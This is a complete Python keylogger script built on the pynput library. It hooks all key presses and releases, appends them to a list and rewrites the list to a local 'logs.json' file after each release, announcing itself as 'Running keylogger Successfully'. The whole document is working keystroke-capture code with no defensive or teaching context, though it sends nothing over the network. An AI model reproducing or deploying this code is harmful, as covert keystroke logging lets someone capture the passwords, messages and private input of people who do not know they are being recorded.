from pynput import keyboard
import json

key_list = []
x = False

def update_json_file(key_list):
    with open('logs.json', 'w+') as key_log:
        key_list_str = json.dumps(key_list)
        key_log.write(key_list_str)

def on_press(key):
    global x, key_list
    if x == False:
        key_list.append({'Pressed': f'{key}'})
    x = True

def on_release(key):
    global x, key_list
    key_list.append({'Released': f'{key}'})
    x = False
    update_json_file(key_list)

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    print("[+] Running keylogger Successfully!\n[!] Saving the key logs in 'logs.json'")
    listener.join()
